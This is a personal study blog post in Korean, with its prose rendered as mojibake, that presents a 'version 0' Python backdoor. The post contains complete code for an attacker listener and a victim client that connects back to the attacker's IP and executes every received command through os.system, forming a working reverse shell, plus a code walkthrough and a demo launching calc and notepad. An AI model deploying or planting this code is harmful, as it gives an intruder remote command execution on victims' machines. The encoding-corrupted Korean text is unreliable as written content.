---
title:  "ë°±ë„ì–´/Backdoor ì•…ì„±ì½”ë“œ íŒŒì´ì¬ êµ¬í˜„ version 0"  

categories:
  - Study
tags:
  - [Hacking, Backdoor, python]
date: 2022-09-04
last_modified_at: 2022-09-04
---
## 1ï¸âƒ£ ë°±ë„ì–´ë€?

- ë°±ë„ì–´ëŠ” ë’·ë¬¸ ì´ë¼ëŠ” ëœ»ìœ¼ë¡œ, í•˜ë“œì›¨ì–´ë‚˜ ì†Œí”„íŠ¸ì›¨ì–´ ë“±ì˜ ê°œë°œê³¼ì •ì´ë‚˜ ìœ í†µê³¼ì • ì¤‘ì— ëª°ë˜ íƒ‘ì¬ë˜ì–´ ì •ìƒì ì¸ ì¸ì¦ ê³¼ì •ì„ ê±°ì¹˜ì§€ ì•Šê³  ë³´ì•ˆì„ í•´ì œí•  ìˆ˜ ìˆë„ë¡ ë§Œë“œëŠ” ì•…ì„±ì½”ë“œì´ë‹¤
- [ë” ì•Œì•„ë³´ê¸°](https://ko.wikipedia.org/wiki/%EB%B0%B1%EB%8F%84%EC%96%B4)

ë” ì•Œì•„ë³¼ê±´ ì—†ìœ¼ë‹ˆ ë°”ë¡œ íŒŒì´ì¬ìœ¼ë¡œ ê°„ë‹¨íˆ êµ¬í˜„í•´ë´…ì‹œë‹¤.

> ì†Œì¼“ì§€ì‹ì„ í•„ìš”ë¡œ í•©ë‹ˆë‹¤! ëª¨ë¥´ì‹ ë‹¤ë©´ ì´í•´ì— ì–´ë ¤ì›€ì„ ê²ªì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤!

<br>

## 2ï¸âƒ£ ë°±ë„ì–´ êµ¬í˜„

**ê³µê²©ì**
```python
import socket #ì†Œì¼“ ëª¨ë“ˆ

server = ('0.0.0.0', 8080)
s = socket.socket()
s.bind(server)
s.listen()
conn, address = s.accept() # victimì—ì„œ ì˜¨ ìš”ì²­ì„ ìˆ˜ë½
print(conn.recv(1024).decode()) # ëˆ„êµ¬ì¸ì§€ í™•ì¸

while True: #ì‰˜ 
  cmd = input("> ")
  conn.send(cmd.encode()) # stripì€ ë¶ˆí•„ìš”í•œ ê³µë°±ì„ ì œê±°
  data = conn.recv(1024).decode()
  print(data)

  if cmd.strip() == 'q': #ì¢…ë£Œ
    break

s.close()
```

**ê³µê²©ëŒ€ìƒ**
```python
import socket
import os

attacker = ('<ê³µê²©ìIPì£¼ì†Œ>', 8080) 
s = socket.socket()
s.connect(attacker)
s.send(b"Hello, this is victim.") # ë¹…íŒ€ì—ì„œ ì ‘ì†í–ˆë‹¤ëŠ” ì˜ë¯¸

while True:
  data = s.recv(1024).decode().strip() # stripì€ ë¶ˆí•„ìš”í•œ ê³µë°±ì„ ì œê±°
  # ë°›ì€ ë°ì´í„°ê°€ që¼ë©´ exit
  if 'q' == data:
    result = 'program exited'
    s.send(result.encode())
    print(result)
    break
  # ë°›ì€ ë°ì´í„°ê°€ ì–´ë–¤ ê°’ìœ¼ë¡œ ì‹œì‘í•˜ëŠ”ì§€ ì‹ë³„
  if data.startswith('cd '): #ê²½ë¡œ ì´ë™
    os.chdir(data[3:])
    result = 'moved to ' + str(os.getcwd())
    s.send(result.encode())
  else:
    os.system(data) #ê²½ë¡œ ì´ë™ì´ ì•„ë‹ì‹œ ê·¸ëƒ¥ cmdì‹¤í–‰
    s.send(b"excuted" + data.encode())
s.close()
```

<br>

## 3ï¸âƒ£ ì½”ë“œ ì„¤ëª…

**ê³µê²©ì ì½”ë“œ(server)**

```python
import socket

server = ('0.0.0.0', 8080)
s = socket.socket()
s.bind(server)
s.listen()
```
- íŒŒì´ì¬ ì†Œì¼“ ëª¨ë“ˆì„ ì´ìš©í•˜ì—¬ ìì‹ ì˜ ì»´í“¨í„° 8080í¬íŠ¸ì—ì„œ í´ë¼ì´ì–¸íŠ¸ì˜ ì ‘ì†ì„ ê¸°ë‹¤ë¦½ë‹ˆë‹¤.

```python
conn, address = s.accept() 
print(conn.recv(1024).decode())
```
- í´ë¼ì´ì–¸íŠ¸ì˜ ìš”ì²­ì´ ë“¤ì–´ì˜¨ í›„, í´ë¼ì´ì–¸íŠ¸ì—ì„œ ë³´ë‚¸ ë©”ì„¸ì§€ë¥¼ ì¶œë ¥

**ê³µê²©ëŒ€ìƒ ì½”ë“œ(client)**

```python
import socket
import os

attacker = ('<ê³µê²©ìIPì£¼ì†Œ>', 8080) 
s = socket.socket()
s.connect(attacker)
s.send(b"Hello, this is victim.")
```
- ê³µê²©ìì—ê²Œ ì ‘ì†í•œ í›„, ìì‹ ì´ ëˆ„êµ¬ì¸ì§€ ì„œë²„ì—ê²Œ ì „ì†¡

ì´ì œ ì‹¤ì œ ì‰˜ êµ¬í˜„ ë¶€ë¶„ì„ ì‚´í´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤

**ê³µê²©ì ì½”ë“œ(server)**

```python
while True:
  cmd = input("> ")
  conn.send(cmd.encode()) 
  data = conn.recv(1024).decode()
  print(data)

  if cmd.strip() == 'q':
    break

s.close()
```

**ê³µê²©ëŒ€ìƒ ì½”ë“œ(client)**

```python
while True:
  data = s.recv(1024).decode().strip() 
  if 'q' == data:
    result = 'program exited'
    s.send(result.encode())
    print(result)
    break
  if data.startswith('cd '): 
    os.chdir(data[3:])
    result = 'moved to ' + str(os.getcwd())
    s.send(result.encode())
  else:
    os.system(data)
    s.send(b"excuted" + data.encode())
s.close()
```
- qì¼ì‹œ ë¹½ë„ì–´ ì¢…ë£Œ
- ì„œë²„ì—ì„œ cdë¥¼ ë¶™ì´ê³  ì „ì†¡ì‹œ ì¸ìë¡œ ì¤€ ê³³ìœ¼ë¡œ ë””ë ‰í„°ë¦¬ ì´ë™ì„ í•©ë‹ˆë‹¤
- ìœ„ ë‘ê°€ì§€ê°€ ì•„ë‹ˆë¼ë©´ ê·¸ëƒ¥ ë°›ì€ ëª…ë ¹ì–´ë¥¼ cmdì—ì„œ ì‹¤í–‰

<br>

## 4ï¸âƒ£ ì‹¤í–‰í™”ë©´

- ì‹¤ì œ ì‹¤í–‰ í™”ë©´ ì…ë‹ˆë‹¤. IDLEë¡œ ì§„í–‰í•˜ì˜€ìŠµë‹ˆë‹¤.
- ì œëŒ€ë¡œ ë§Œë“¤ì—ˆë‹¤ëŠ” ê²ƒì„ í™•ì¸í•˜ê¸° ìœ„í•´ C:\Windows\System32ì— ì¡´ì¬í•˜ëŠ” ê³„ì‚°ê¸°ì™€ ë…¸íŠ¸íŒ¨ë“œë¥¼ ì‹¤í–‰í•´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.

1. í´ë¼ì´ì–¸íŠ¸ ì ‘ì†
![ì ‘ì†](../../imgs/%EB%B0%B1%EB%8F%84%EC%96%B40/%EC%A0%91%EC%86%8D.PNG)
2. C:\Windows\System32ë¡œ ì´ë™
![ì´ë™](../../imgs/%EB%B0%B1%EB%8F%84%EC%96%B40/%EC%9D%B4%EB%8F%99.PNG)
- í´ë¼ì´ì–¸íŠ¸ ì¸¡ì—ì„œëŠ” ì¶œë ¥ì´ ì—†ëŠ”ê²Œ ì •ìƒì…ë‹ˆë‹¤.
3. ê³„ì‚°ê¸° ì‹¤í–‰
![ê³„ì‚°ê¸°](../../imgs/%EB%B0%B1%EB%8F%84%EC%96%B40/%EA%B3%84%EC%82%B0%EA%B8%B0.PNG)
- ê³„ì‚°ê¸° ì‹¤í–‰ì— ì„±ê³µí–ˆìŠµë‹ˆë‹¤!
4. ë…¸íŠ¸íŒ¨ë“œ ì‹¤í–‰
![ë…¸íŠ¸íŒ¨ë“œ](../../imgs/%EB%B0%B1%EB%8F%84%EC%96%B40/%EB%85%B8%ED%8A%B8%ED%8C%A8%EB%93%9C.PNG)
- ë…¸íŠ¸íŒ¨ë“œ ì‹¤í–‰ë„ ì„±ê³µ!
5. ì ‘ì† ì¢…ë£Œ
![ì¢…ë£Œ](../../imgs/%EB%B0%B1%EB%8F%84%EC%96%B40/%EC%A2%85%EB%A3%8C.PNG)
- ì¢…ë£Œ

<br>

## 5ï¸âƒ£ ë§ˆë¬´ë¦¬

ì´ì œë¶€í„° ê³„ì†í•´ì„œ ë°±ë„ì–´ë¥¼ ì—…ê·¸ë ˆì´ë“œ í•´ë‚˜ê°ˆë ¤ê³  í•©ë‹ˆë‹¤! 

ì•„ì§ì€ version 0ì´ì§€ë§Œ, ì•ìœ¼ë¡œ ê¸°ëŒ€í•´ì£¼ì„¸ìš”!

***
<br>

    ğŸŒœ ê°œì¸ ê³µë¶€ ê¸°ë¡ìš© ë¸”ë¡œê·¸ì…ë‹ˆë‹¤. ì˜¤ë¥˜ë‚˜ í‹€ë¦° ë¶€ë¶„ì´ ìˆì„ ê²½ìš° 
    ì–¸ì œë“ ì§€ ëŒ“ê¸€ í˜¹ì€ ë©”ì¼ë¡œ ì§€ì í•´ì£¼ì‹œë©´ ê°ì‚¬í•˜ê² ìŠµë‹ˆë‹¤! ğŸ˜„

[ë§¨ ìœ„ë¡œ ì´ë™í•˜ê¸°](#){: .btn .btn--primary }{: .align-right}